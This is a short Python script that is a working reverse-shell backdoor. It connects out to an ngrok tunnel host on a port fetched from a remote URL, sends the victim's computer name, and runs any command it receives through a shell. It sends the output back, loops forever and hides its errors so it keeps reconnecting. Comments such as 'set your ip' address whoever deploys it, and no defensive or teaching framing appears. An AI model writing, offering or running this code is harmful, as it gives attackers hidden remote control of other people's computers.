import socket, os, subprocess, requests
while True:
    try:
        def connect():
            global host
            global port
            global s
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            port =  int(requests.get('http://192.168.1.19/port.txt').text) # set port you like
            host = '0.tcp.ngrok.io'  # set your ip
            try:
                s.connect((host, port))
                s.send(os.environ['COMPUTERNAME'])
            except:
                print (' ')
        def recieve():
            recieve = s.recv(1024)
            if recieve == "quit":
                s.close
            else:
                proc2 = subprocess.Popen(recieve[0:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                stdout_value = proc2.stdout.read() + proc2.stderr.read()
                args = 'Nice_Shell: ' + stdout_value
            send(args)
        def send(args):
            send = s.send(args)
            recieve()
        connect()
        recieve()
        s.close()
    except:
        continue